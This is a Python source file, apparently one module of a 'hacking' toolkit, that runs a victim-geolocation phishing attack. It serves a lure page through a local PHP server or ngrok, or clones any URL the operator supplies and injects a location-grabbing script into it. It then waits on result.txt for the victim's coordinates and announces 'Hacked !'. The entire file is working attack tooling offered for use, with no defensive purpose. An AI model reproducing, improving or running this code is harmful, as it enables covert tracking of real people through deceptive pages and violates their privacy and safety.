def location():
    from colorama import Fore , Style , Back
    import time , os , sys , platform , subprocess , random , threading , psutil , datetime , requests
    from modules import banners
    banners.loc_banner()
    time.sleep(0.1)
    banners.loc_menu()
    select = input(Fore.LIGHTWHITE_EX + f"    Select > "+Fore.LIGHTRED_EX)

    def default():
        os.chdir("attacks")
        os.chdir("location")
        port = random.choice(range(1011,9999))
        def clear():
            if "Windows" in platform.uname():
                os.system("cls")
            else:
                os.system("clear")
        clear()
        banners.hacking()
        banners.hacking_menu()
        select = input(Fore.LIGHTWHITE_EX + f"    Select > "+Fore.LIGHTRED_EX)
        if select == "1":
            php_server_process = subprocess.Popen(["php","-S",f"localhost:{port}"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
            clear()
            x=5
            while x:
                banners.hacking()
                print(Fore.LIGHTGREEN_EX + "\033[1m" + f"\n    Localhost started , Port : {port}")
                time.sleep(9)
                y=10
                while y:
                    data = open("result.txt","r").read()
                    if data == "":
                        clear()
                        banners.hacking_()
                        print(Fore.LIGHTGREEN_EX + "\033[1m" + f"\n    Tracking Victim...")
                        time.sleep(5)                        
                    else:
                        y=0
                x=0               
            php_server_process.terminate()
            clear()
            banners.hacking()
            print(Fore.LIGHTGREEN_EX + "\n    Hacked ! , "+ Back.LIGHTRED_EX + Fore.BLACK + data + Style.RESET_ALL)
            time.sleep(3)
            input(Fore.LIGHTYELLOW_EX + "\n    Press Enter For Main Page")
            open("result.txt","w").write("")
            os.chdir("../..")
        elif select == "2":
            clear()
            banners.hacking()
            print(Fore.LIGHTGREEN_EX + "\033[1m" + f"\n    Running Ngrok On {port} , Please Wait...")
            print(Fore.LIGHTGREEN_EX + "\033[1m" + f"\n    Ngrok Runned , If You See {Fore.LIGHTRED_EX} handler.php {Fore.LIGHTGREEN_EX} Please Press Control+C")
            php_server_process = subprocess.Popen(["php","-S",f"localhost:{port}"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
            time.sleep(6)
            os.system(f"ngrok http {port}")
            php_server_process.terminate()
            clear()
            banners.hacking()
            data = open("result.txt","r").read()
            print(Fore.LIGHTGREEN_EX + "\n    Hacked ! , "+ Back.LIGHTRED_EX + Fore.BLACK + data + Style.RESET_ALL)
            time.sleep(3)
            input(Fore.LIGHTYELLOW_EX + "\n    Press Enter For Main Page")
            open("result.txt","w").write("")
            os.chdir("../..")
        else:
            os.chdir("../..")

    def custom():
        os.chdir("attacks")
        os.chdir("location")
        os.chdir("customize")
        def clear():
            if "windows" in platform.uname():
                os.system("cls")
            else:
                os.system("clear")
        clear()
        banners.hacking()
        url = input(Fore.LIGHTGREEN_EX + "\033[1m" + "\n    Please Enter The Url : "+ "\033[0m" + Fore.LIGHTRED_EX )
        print(Fore.LIGHTYELLOW_EX + "\n    Preparing The Page....")
        respone = requests.get(url=url).text
        script = open("sors.txt","r").read()
        sorse = f"""
{script}
<script>locate()</script>
{respone}
        """
        open("index.html",mode="w").write(sorse)
        time.sleep(1.5)
        port = random.choice(range(1011,9999))
        def clear():
            if "windows" in platform.uname():
                os.system("cls")
            else:
                os.system("clear")
        clear()
        banners.hacking()
        banners.hacking_menu2()
        select = input(Fore.LIGHTWHITE_EX + f"    Select > "+Fore.LIGHTRED_EX)
        if select == "1":
            php_server_process = subprocess.Popen(["php","-S",f"localhost:{port}"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
            clear()
            x=5
            while x:
                banners.hacking()
                print(Fore.LIGHTGREEN_EX + "\033[1m" + f"\n    Localhost started , Port : {port}")
                time.sleep(9)
                y=10
                while y:
                    data = open("result.txt","r").read()
                    if data == "":
                        clear()
                        banners.hacking_()
                        print(Fore.LIGHTGREEN_EX + "\033[1m" + f"\n    Tracking Victim...")
                        time.sleep(5)                        
                    else:
                        y=0
                x=0               
            php_server_process.terminate()
            clear()
            banners.hacking()
            print(Fore.LIGHTGREEN_EX + "\n    Hacked ! , "+ Back.LIGHTRED_EX + Fore.BLACK + data + Style.RESET_ALL)
            time.sleep(3)
            input(Fore.LIGHTYELLOW_EX + "\n    Press Enter For Main Page")
            open("result.txt","w").write("")
            os.chdir("../../..")
        elif select == "2":
            clear()
            banners.hacking()
            print(Fore.LIGHTGREEN_EX + "\033[1m" + f"\n    Running Ngrok On {port} , Please Wait...")
            print(Fore.LIGHTGREEN_EX + "\033[1m" + f"\n    Ngrok Runned , If You See {Fore.LIGHTRED_EX} handler.php {Fore.LIGHTGREEN_EX} Please Press Control+C")
            php_server_process = subprocess.Popen(["php","-S",f"localhost:{port}"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
            time.sleep(6)
            os.system(f"ngrok http {port}")
            php_server_process.terminate()
            clear()
            banners.hacking()
            data = open("result.txt","r").read()
            print(Fore.LIGHTGREEN_EX + "\n    Hacked ! , "+ Back.LIGHTRED_EX + Fore.BLACK + data + Style.RESET_ALL)
            time.sleep(3)
            input(Fore.LIGHTYELLOW_EX + "\n    Press Enter For Main Page")
            open("result.txt","w").write("")
            os.chdir("../../..")
        else:
            os.chdir("../../..")

    if select == "1":
        default()
    elif select == "2":
        custom()
    else:
        pass